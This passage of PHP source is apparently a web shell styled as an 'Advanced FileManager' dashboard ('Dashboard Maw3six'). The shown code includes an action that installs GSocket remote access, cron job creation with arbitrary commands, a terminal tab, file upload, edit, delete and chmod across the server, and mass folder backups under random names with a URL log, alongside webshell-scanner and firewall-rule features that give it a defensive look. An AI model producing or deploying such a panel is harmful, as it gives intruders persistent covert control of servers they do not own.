                            <strong class='text-orange-400'>🔍 Context:</strong><br>
                            <pre style='background: #000; border: 1px solid #333; padding: 10px; margin: 5px 0; font-size: 11px; white-space: pre-wrap; word-wrap: break-word; max-height: 150px; overflow-y: auto;'>" . htmlspecialchars($result['context']) . "</pre>
                        </div>
                        
                        <div class='flex flex-wrap gap-2 mt-3'>
                            <button onclick='viewFileFromPath(\"" . htmlspecialchars(addslashes($result['file'])) . "\")' 
                                    class='bg-blue-700 hover:bg-blue-600 text-white px-3 py-1 rounded text-sm'>
                                <i class='bi bi-eye mr-1'></i>View
                            </button>
                            <button onclick='editFileFromPath(\"" . htmlspecialchars(addslashes($result['file'])) . "\")' 
                                    class='bg-yellow-700 hover:bg-yellow-600 text-white px-3 py-1 rounded text-sm'>
                                <i class='bi bi-pencil mr-1'></i>Edit
                            </button>
                            <button onclick='deleteWebshell(\"" . htmlspecialchars(addslashes($result['file'])) . "\")' 
                                    class='bg-red-700 hover:bg-red-600 text-white px-3 py-1 rounded text-sm'>
                                <i class='bi bi-trash mr-1'></i>Delete
                            </button>
                        </div>
                    </div>";
                }
                $actionResult .= "</div>";
                $actionResultType = "warning";
            }
            break;
            
        case 'install_gsocket':
            $result = installGSocket();
            $actionResult = "GSocket installation " . ($result['success'] ? "successful" : "failed") . ":<br><pre class='bg-black border border-green-600 text-green-400 p-4 rounded'>" . htmlspecialchars($result['output']) . "</pre>";
            $actionResultType = $result['success'] ? "success" : "danger";
            break;
            
        // Fitur baru
        case 'file_integrity':
            $changes = monitorFileIntegrity($_POST['path']);
            if (empty($changes)) {
                $actionResult = "✅ No file changes detected";
                $actionResultType = "success";
            } else {
                $actionResult = "⚠️ File integrity changes detected:<br><br>";
                foreach ($changes as $change) {
                    $actionResult .= "<div class='mb-2 p-2 bg-gray-800 rounded'>" . 
                        ucfirst($change['type']) . ": " . htmlspecialchars($change['file']) . "</div>";
                }
                $actionResultType = "warning";
            }
            break;
            
        case 'firewall_rules':
            $result = generateFirewallRules($_POST['path']);
            $actionResult = "🛡️ Firewall rules generated:<br>";
            $actionResult .= "✅ Created .htaccess files: " . $result['created'] . "<br>";
            if (!empty($result['errors'])) {
                $actionResult .= "❌ Errors:<br>" . implode("<br>", $result['errors']);
            }
            $actionResultType = "info";
            break;
            
        case 'add_cron':
            if (addCronJob($_POST['schedule'], $_POST['command'])) {
                $actionResult = "✅ Cron job added successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "❌ Failed to add cron job";
                $actionResultType = "danger";
            }
            break;
            
        case 'remove_cron':
            if (removeCronJob($_POST['index'])) {
                $actionResult = "✅ Cron job removed successfully";
                $actionResultType = "success";
            } else {
                $actionResult = "❌ Failed to remove cron job";
                $actionResultType = "danger";
            }
            break;
            
        case 'bulk_operation':
            $paths = explode("\n", trim($_POST['paths']));
            $paths = array_filter(array_map('trim', $paths));
            $operation = $_POST['bulk_action'];
            $params = [];
            
            if ($operation === 'chmod') {
                $params['mode'] = $_POST['chmod_mode'] ?? '0755';
            } elseif ($operation === 'backup') {
                $params['backup_dir'] = $_POST['backup_dir'] ?? '';
            } elseif ($operation === 'move') {
                $params['destination'] = $_POST['move_destination'] ?? '';
            }
            
            $results = bulkOperation($paths, $operation, $params);
            $actionResult = "📊 Bulk operation results:<br><br>";
            $success = 0;
            $failed = 0;
            
            foreach ($results as $result) {
                if ($result['status'] === 'success') {
                    $success++;
                    $actionResult .= "✅ " . htmlspecialchars($result['path']) . " - " . $result['message'] . "<br>";
                } else {
                    $failed++;
                    $actionResult .= "❌ " . htmlspecialchars($result['path']) . " - " . $result['message'] . "<br>";
                }
            }
            
            $actionResult .= "<br>📊 Summary: $success successful, $failed failed";
            $actionResultType = $success > 0 ? "info" : "danger";
            break;
            
        case 'search_files':
            $query = $_POST['search_query'] ?? '';
            $extensions = !empty($_POST['search_extensions']) ? explode(',', $_POST['search_extensions']) : [];
            $extensions = array_map('trim', $extensions);
            $minSize = intval($_POST['min_size'] ?? 0);
            $maxSize = intval($_POST['max_size'] ?? PHP_INT_MAX);
            
            $results = searchFiles($_POST['path'], $query, $extensions, $minSize, $maxSize);
            
            if (empty($results)) {
                $actionResult = "🔍 No files found matching your criteria";
                $actionResultType = "info";
            } else {
                $actionResult = "🔍 Found " . count($results) . " files:<br><br>";
                foreach ($results as $result) {
                    $icon = $result['is_dir'] ? '📁' : '📄';
                    $actionResult .= "<div class='mb-2 p-2 bg-gray-800 rounded'>" . 
                        $icon . " " . htmlspecialchars($result['path']) . 
                        " (" . formatBytes($result['size']) . ") - " . 
                        $result['modified'] . "</div>";
                }
                $actionResultType = "info";
            }
            break;
    }
}

// Dapatkan path saat ini
$currentPath = isset($_GET['path']) ? $_GET['path'] : $ROOT_DIR;
if (!is_dir($currentPath)) {
    $currentPath = $ROOT_DIR;
}

// Dapatkan daftar file dan folder
$items = [];
if (is_dir($currentPath)) {
    $dir = opendir($currentPath);
    while (($item = readdir($dir)) !== false) {
        if ($item != "." && $item != "..") {
            $items[] = $item;
        }
    }
    closedir($dir);
    sort($items);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced FileManager</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <style>
        body {
            background: <?php echo $THEME === 'dark' ? '#000' : '#f0f0f0'; ?>;
            color: <?php echo $THEME === 'dark' ? '#00ff00' : '#333'; ?>;
            font-family: 'Courier New', monospace;
        }
        .terminal-input:focus {
            outline: none;
            box-shadow: 0 0 0 2px #00ff00;
        }
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 1rem;
        }
        .scrollbar-hide::-webkit-scrollbar {
            display: none;
        }
        .scrollbar-hide {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
        }
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .break-all {
            word-break: break-all;
        }
        .theme-<?php echo $THEME; ?> {
            background: <?php echo $THEME === 'dark' ? '#000' : '#f0f0f0'; ?>;
            color: <?php echo $THEME === 'dark' ? '#00ff00' : '#333'; ?>;
        }
    </style>
</head>
<body class="min-h-screen theme-<?php echo $THEME; ?>">
    <!-- Header -->
    <header class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border-b border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> p-4">
        <div class="container mx-auto flex justify-between items-center">
            <h1 class="text-2xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>">
                <i class="bi bi-hdd-network mr-2"></i>Dashboard Maw3six
            </h1>
            <div class="flex items-center space-x-4">
                <form method="post" class="inline">
                    <button type="submit" name="toggle_theme" class="bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> px-3 py-1 rounded">
                        <i class="bi bi-<?php echo $THEME === 'dark' ? 'sun' : 'moon'; ?> mr-1"></i>
                        <?php echo $THEME === 'dark' ? 'Light' : 'Dark'; ?>
                    </button>
                </form>
                <span class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">
                    <i class="bi bi-person mr-1"></i><?php echo htmlspecialchars($_SESSION['username']); ?>
                </span>
                <a href="?logout=1" class="bg-red-900 hover:bg-red-800 border border-red-600 <?php echo $THEME === 'dark' ? 'text-red-300' : 'text-white'; ?> px-4 py-2 rounded transition duration-200">
                    <i class="bi bi-box-arrow-right mr-1"></i>Logout
                </a>
            </div>
        </div>
    </header>

    <div class="container mx-auto p-4">
        <div class="flex flex-col lg:flex-row gap-6">
            <!-- Sidebar -->
            <aside class="lg:w-1/4">
                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-4 mb-6">
                    <h3 class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-4">
                        <i class="bi bi-menu-app mr-2"></i>Navigation
                    </h3>
                    <nav class="space-y-2">
                        <button onclick="showTab('filemanager')" class="w-full text-left bg-green-900 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> px-4 py-2 rounded active-tab">
                            <i class="bi bi-folder mr-2"></i>File Manager
                        </button>
                        <button onclick="showTab('server')" class="w-full text-left bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> px-4 py-2 rounded">
                            <i class="bi bi-info-circle mr-2"></i>Server Info
                        </button>
                        <button onclick="showTab('tools')" class="w-full text-left bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> px-4 py-2 rounded">
                            <i class="bi bi-tools mr-2"></i>Security Tools
                        </button>
                        <button onclick="showTab('monitoring')" class="w-full text-left bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> px-4 py-2 rounded">
                            <i class="bi bi-activity mr-2"></i>Monitoring
                        </button>
                        <button onclick="showTab('terminal')" class="w-full text-left bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> hover:bg-<?php echo $THEME === 'dark' ? 'gray-700' : 'gray-200'; ?> border border-<?php echo $THEME === 'dark' ? 'gray-600' : 'gray-300'; ?> <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> px-4 py-2 rounded">
                            <i class="bi bi-terminal mr-2"></i>Terminal
                        </button>
                    </nav>
                </div>

                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-4">
                    <h3 class="text-lg font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-4">
                        <i class="bi bi-hdd mr-2"></i>System Info
                    </h3>
                    <div class="space-y-2 text-sm">
                        <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">
                            <i class="bi bi-hdd mr-1"></i>Disk Free: <?php echo disk_free_space("/") ? round(disk_free_space("/") / (1024*1024*1024), 2) . " GB" : "Unknown"; ?>
                        </p>
                        <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">
                            <i class="bi bi-cpu mr-1"></i>PHP: <?php echo phpversion(); ?>
                        </p>
                        <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?>">
                            <i class="bi bi-folder mr-1"></i>Items: <?php echo count($items); ?>
                        </p>
                    </div>
                </div>
            </aside>

            <!-- Main Content -->
            <main class="lg:w-3/4">
                <!-- Action Result - Tidak akan hilang otomatis -->
                <?php if ($showActionResult && $actionResult): ?>
                    <div class="bg-<?php 
                        echo $actionResultType == 'success' ? 'green' : 
                             ($actionResultType == 'danger' ? 'red' : 
                             ($actionResultType == 'warning' ? 'yellow' : 'blue'));
                    ?>-900 border border-<?php 
                        echo $actionResultType == 'success' ? 'green' : 
                             ($actionResultType == 'danger' ? 'red' : 
                             ($actionResultType == 'warning' ? 'yellow' : 'blue'));
                    ?>-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-' . $actionResultType . '-700'; ?> px-6 py-4 rounded-lg mb-6 relative">
                        <div class="flex justify-between items-start">
                            <div>
                                <h4 class="font-bold text-lg mb-2">
                                    <i class="bi <?php 
                                        echo $actionResultType == 'success' ? 'bi-check-circle' : 
                                             ($actionResultType == 'danger' ? 'bi-exclamation-triangle' : 
                                             ($actionResultType == 'warning' ? 'bi-exclamation-triangle' : 'bi-info-circle'));
                                    ?> mr-2"></i>
                                    <?php 
                                        echo $actionResultType == 'success' ? 'SUCCESS' : 
                                             ($actionResultType == 'danger' ? 'ERROR' : 
                                             ($actionResultType == 'warning' ? 'WARNING' : 'INFO'));
                                    ?>
                                </h4>
                                <div><?php echo $actionResult; ?></div>
                            </div>
                            <button onclick="this.parentElement.parentElement.style.display='none'" class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-' . $actionResultType . '-700'; ?> hover:<?php echo $THEME === 'dark' ? 'text-green-100' : 'text-' . $actionResultType . '-900'; ?> text-2xl">&times;</button>
                        </div>
                    </div>
                <?php endif; ?>

                <!-- File Manager Tab -->
                <div id="filemanager" class="tab-content active">
                    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-6 mb-6">
                        <div class="flex justify-between items-center mb-6">
                            <h2 class="text-xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?>">
                                <i class="bi bi-folder2-open mr-2"></i>File Manager
                            </h2>
                            <span class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm">
                                <i class="bi bi-folder mr-1"></i><?php echo count($items); ?> items
                            </span>
                        </div>

                        <!-- Path Breadcrumb -->
                        <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded p-3 mb-6">
                            <div class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm flex items-center flex-wrap">
                                <i class="bi bi-folder mr-2"></i>
                                <span>Path:</span>
                                <?php 
                                $pathParts = explode('/', trim($currentPath, '/'));
                                $pathSoFar = '';
                                foreach ($pathParts as $i => $part):
                                    $pathSoFar .= '/' . $part;
                                    if ($i == count($pathParts) - 1):
                                ?>
                                    <span class="ml-1"><?php echo htmlspecialchars($part ?: '/'); ?></span>
                                <?php else: ?>
                                    <a href="?path=<?php echo urlencode($pathSoFar); ?>" class="<?php echo $THEME === 'dark' ? 'text-green-400 hover:text-green-300' : 'text-blue-600 hover:text-blue-800'; ?> ml-1"><?php echo htmlspecialchars($part ?: '/'); ?></a>
                                    <span class="mx-1">/</span>
                                <?php endif; endforeach; ?>
                            </div>
                        </div>

                        <!-- File Grid -->
                        <div class="file-grid mb-6">
                            <!-- Parent Directory -->
                            <?php if ($currentPath != $ROOT_DIR): ?>
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4 text-center hover:border-green-500 transition duration-200">
                                    <div class="text-4xl mb-2 text-yellow-400">📁</div>
                                    <div class="font-bold <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-800'; ?> truncate">..</div>
                                    <div class="text-xs <?php echo $THEME === 'dark' ? 'text-green-500' : 'text-gray-600'; ?> mt-2">Parent Directory</div>
                                    <div class="mt-3">
                                        <a href="?path=<?php echo urlencode(dirname($currentPath)); ?>" class="bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> text-xs px-3 py-1 rounded">
                                            <i class="bi bi-folder2-open"></i>
                                        </a>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <?php foreach ($items as $item): 
                                $fullPath = $currentPath . '/' . $item;
                                $isDir = is_dir($fullPath);
                                $size = $isDir ? '-' : round(filesize($fullPath) / 1024, 2) . ' KB';
                                $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                                $ext = pathinfo($item, PATHINFO_EXTENSION);
                            ?>
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4 text-center hover:border-green-500 transition duration-200">
                                    <div class="text-4xl mb-2 <?php echo $isDir ? 'text-yellow-400' : ($THEME === 'dark' ? 'text-green-400' : 'text-gray-800'); ?>">
                                        <?php if ($isDir): ?>
                                            📁
                                        <?php elseif (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp'])): ?>
                                            🖼️
                                        <?php elseif (in_array($ext, ['txt', 'md', 'log'])): ?>
                                            📄
                                        <?php elseif (in_array($ext, ['zip', 'rar', 'tar', 'gz'])): ?>
                                            📦
                                        <?php elseif (in_array($ext, ['mp3', 'wav', 'ogg'])): ?>
                                            🎵
                                        <?php elseif (in_array($ext, ['mp4', 'avi', 'mov', 'mkv'])): ?>
                                            🎬
                                        <?php else: ?>
                                            📄
                                        <?php endif; ?>
                                    </div>
                                    <div class="font-bold <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-800'; ?> truncate" title="<?php echo htmlspecialchars($item); ?>">
                                        <?php echo htmlspecialchars($item); ?>
                                    </div>
                                    <div class="text-xs <?php echo $THEME === 'dark' ? 'text-green-500' : 'text-gray-600'; ?> mt-1">
                                        Size: <?php echo $size; ?>
                                    </div>
                                    <div class="text-xs <?php echo $THEME === 'dark' ? 'text-green-500' : 'text-gray-600'; ?>">
                                        Perms: <?php echo $perms; ?>
                                    </div>
                                    <div class="mt-3 flex flex-wrap justify-center gap-1">
                                        <?php if ($isDir): ?>
                                            <a href="?path=<?php echo urlencode($fullPath); ?>" class="bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="Open">
                                                <i class="bi bi-folder2-open"></i>
                                            </a>
                                        <?php else: ?>
                                            <button onclick="viewFile('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo htmlspecialchars(addslashes($currentPath)); ?>')" class="bg-blue-900 hover:bg-blue-800 border border-blue-600 <?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="View">
                                                <i class="bi bi-eye"></i>
                                            </button>
                                            <button onclick="editFile('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo htmlspecialchars(addslashes($currentPath)); ?>')" class="bg-yellow-900 hover:bg-yellow-800 border border-yellow-600 <?php echo $THEME === 'dark' ? 'text-yellow-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="Edit">
                                                <i class="bi bi-pencil"></i>
                                            </button>
                                        <?php endif; ?>
                                        <button onclick="chmodItem('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo htmlspecialchars($perms); ?>', '<?php echo htmlspecialchars(addslashes($currentPath)); ?>')" class="bg-purple-900 hover:bg-purple-800 border border-purple-600 <?php echo $THEME === 'dark' ? 'text-purple-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="Chmod">
                                            <i class="bi bi-key"></i>
                                        </button>
                                        <button onclick="renameItem('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo htmlspecialchars(addslashes($currentPath)); ?>')" class="bg-blue-900 hover:bg-blue-800 border border-blue-600 <?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="Rename">
                                            <i class="bi bi-pencil-square"></i>
                                        </button>
                                        <button onclick="deleteItem('<?php echo htmlspecialchars(addslashes($item)); ?>', '<?php echo htmlspecialchars(addslashes($currentPath)); ?>')" class="bg-red-900 hover:bg-red-800 border border-red-600 <?php echo $THEME === 'dark' ? 'text-red-300' : 'text-white'; ?> text-xs px-2 py-1 rounded" title="Delete">
                                            <i class="bi bi-trash"></i>
                                        </button>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        </div>

                        <!-- Quick Actions -->
                        <div class="grid md:grid-cols-3 gap-4">
                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-upload mr-2"></i>Upload File
                                </h3>
                                <form method="post" enctype="multipart/form-data">
                                    <input type="hidden" name="action" value="upload">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <input type="file" name="file" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mb-3 terminal-input" required>
                                    <button type="submit" class="w-full bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-upload mr-1"></i>Upload
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-folder-plus mr-2"></i>Create Folder
                                </h3>
                                <form method="post">
                                    <input type="hidden" name="action" value="create_folder">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <input type="text" name="folder_name" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mb-3 terminal-input" placeholder="Folder name" required>
                                    <button type="submit" class="w-full bg-blue-900 hover:bg-blue-800 border border-blue-600 <?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-folder-plus mr-1"></i>Create
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-file-earmark-plus mr-2"></i>Create File
                                </h3>
                                <form method="post">
                                    <input type="hidden" name="action" value="create_file">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <input type="text" name="file_name" class="w-full <?php echo $THEME === 'dark' ? 'bg-gray-700 border-green-600 text-green-400' : 'bg-white border-gray-300 text-gray-700'; ?> py-2 px-3 rounded mb-3 terminal-input" placeholder="File name" required>
                                    <button type="submit" class="w-full bg-purple-900 hover:bg-purple-800 border border-purple-600 <?php echo $THEME === 'dark' ? 'text-purple-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-file-earmark-plus mr-1"></i>Create
                                    </button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Server Info Tab -->
                <div id="server" class="tab-content">
                    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-6">
                        <h2 class="text-xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-6">
                            <i class="bi bi-info-circle mr-2"></i>Server Information
                        </h2>
                        <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
                            <?php 
                            $serverInfo = getServerInfo();
                            foreach ($serverInfo as $key => $value): 
                            ?>
                                <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-4">
                                    <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-2">
                                        <i class="bi bi-server mr-1"></i><?php echo htmlspecialchars($key); ?>
                                    </h3>
                                    <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm"><?php echo htmlspecialchars($value); ?></p>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>

                <!-- Tools Tab -->
                <div id="tools" class="tab-content">
                    <div class="bg-<?php echo $THEME === 'dark' ? 'gray-900' : 'white'; ?> border border-<?php echo $THEME === 'dark' ? 'green-600' : 'gray-300'; ?> rounded-lg p-6">
                        <h2 class="text-xl font-bold <?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> mb-6">
                            <i class="bi bi-tools mr-2"></i>Security Tools
                        </h2>
                        <div class="grid md:grid-cols-2 gap-4">
                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-search mr-2"></i>Webshell Scanner
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-2">Scanning from: <?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT']); ?></p>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs mb-4">Scan for suspicious files that may contain malicious code.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="scan_webshell">
                                    <button type="submit" class="w-full bg-yellow-900 hover:bg-yellow-800 border border-yellow-600 <?php echo $THEME === 'dark' ? 'text-yellow-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-search mr-1"></i>Scan Entire Document Root
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-shield-lock mr-2"></i>Firewall Rules Generator
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-2">Current directory: <?php echo htmlspecialchars(basename($currentPath)); ?></p>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs mb-4">Generate .htaccess security rules in all subdirectories.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="firewall_rules">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <button type="submit" class="w-full bg-purple-900 hover:bg-purple-800 border border-purple-600 <?php echo $THEME === 'dark' ? 'text-purple-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-shield-lock mr-1"></i>Generate Firewall Rules
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-download mr-2"></i>Mass Backup
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-2">Current directory: <?php echo htmlspecialchars(basename($currentPath)); ?></p>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs mb-4">Create backups of all folders with random names and download log with URLs.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="mass_backup">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <button type="submit" class="w-full bg-green-900 hover:bg-green-800 border border-green-600 <?php echo $THEME === 'dark' ? 'text-green-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-download mr-1"></i>Create Backups & Log
                                    </button>
                                </form>
                            </div>

                            <div class="bg-<?php echo $THEME === 'dark' ? 'gray-800' : 'gray-100'; ?> border border-<?php echo $THEME === 'dark' ? 'green-700' : 'gray-300'; ?> rounded-lg p-5">
                                <h3 class="<?php echo $THEME === 'dark' ? 'text-green-400' : 'text-gray-800'; ?> font-bold mb-3">
                                    <i class="bi bi-file-earmark-check mr-2"></i>File Integrity Monitor
                                </h3>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-sm mb-2">Current directory: <?php echo htmlspecialchars(basename($currentPath)); ?></p>
                                <p class="<?php echo $THEME === 'dark' ? 'text-green-300' : 'text-gray-700'; ?> text-xs mb-4">Monitor file changes and detect unauthorized modifications.</p>
                                <form method="post">
                                    <input type="hidden" name="action" value="file_integrity">
                                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentPath); ?>">
                                    <button type="submit" class="w-full bg-blue-900 hover:bg-blue-800 border border-blue-600 <?php echo $THEME === 'dark' ? 'text-blue-300' : 'text-white'; ?> py-2 rounded">
                                        <i class="bi bi-file-earmark-check mr-1"></i>Check File Integrity
                                    </button>
                                </form>
                            </div>

